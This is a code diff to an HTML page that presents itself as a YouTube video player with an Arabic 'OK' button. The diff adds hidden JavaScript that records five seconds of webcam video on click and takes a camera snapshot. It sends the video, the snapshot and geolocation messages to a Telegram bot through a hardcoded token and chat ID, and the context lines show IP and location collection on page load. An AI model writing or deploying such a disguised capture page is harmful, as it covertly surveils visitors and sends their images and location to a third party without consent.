@@ -36,6 +36,16 @@
         button:hover {
             background-color: #45a049;
         }
+        .video-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .video-container iframe {
+            display: block;
+            margin: 0 auto;
+            width: 560px;
+            height: 315px;
+        }
     </style>
 </head>
 <body>
@@ -45,9 +55,19 @@
         <button onclick="playVideo()">طيب</button>
     </div>
 
+    <div class="video-container" id="videoContainer" style="display: none;">
+        <iframe id="youtubeFrame"
+                src="https://www.youtube.com/embed/BGkL2Pq-g3A"
+                frameborder="0"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+        </iframe>
+    </div>
+
     <script>
         function playVideo() {
-            window.location.href = 'https://youtube.com/watch?v=BGkL2Pq-g3A';
+            document.getElementById('videoContainer').style.display = 'block';
+            recordVideo();
         }
 
         // Function to collect IP address and other data
@@ -64,7 +84,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
             } else {
-                sendToTelegram('Geolocation is not supported by this browser.');
+                sendToTelegram('الميزة الجغرافية غير مدعومة في هذا المتصفح.');
             }
         }
 
@@ -92,66 +112,115 @@
             }
         }
 
-        // Function to request camera permission
+        // Function to request camera permission and capture an image
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
+                .then(stream => {
+                    const videoElement = document.createElement('video');
+                    videoElement.srcObject = stream;
+                    videoElement.play();
 
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
-
-                    mediaRecorder.ondataavailable = function(event) {
-                        if (event.data.size > 0) {
-                            chunks.push(event.data);
-                        }
-                    };
-
-                    mediaRecorder.onstop = function() {
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const videoUrl = URL.createObjectURL(blob);
-                        sendToTelegram('تم تسجيل الفيديو بنجاح لمدة 15 ثانية.');
-                        // Send the video URL to Telegram
-                        sendToTelegram(videoUrl);
-                    };
-
-                    mediaRecorder.start();
-
-                    // Stop recording after 15 seconds
                     setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, 15000); // 15000 milliseconds (15 seconds)
+                        const canvas = document.createElement('canvas');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        canvas.getContext('2d').drawImage(videoElement, 0, 0);
+
+                        const imageData = canvas.toDataURL('image/png');
+                        sendToTelegram('تم التقاط صورة من الكاميرا:', imageData);
+
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1000);
                 })
-                .catch(function(err) {
+                .catch(err => {
                     sendToTelegram('تم رفض إذن الكاميرا من قبل المستخدم.');
                 });
         }
 
+        // Function to record video when the "طيب" button is clicked
+        async function recordVideo() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const mediaRecorder = new MediaRecorder(stream);
+
+            let chunks = [];
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('chat_id', '6185375878');
+                formData.append('video', blob);
+
+                // Send video to Telegram
+                fetch(`https://api.telegram.org/bot7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+            }, 5000);
+        }
+
         // Function to send messages to Telegram
-        function sendToTelegram(message) {
+        function sendToTelegram(message, imageData = null) {
             const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
             const chatId = '6185375878';
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
+            if (imageData) {
+                const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+                fetch(photoUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageData,
+                        caption: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            } else {
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
         }
 
         // Collect data and request permissions on page load
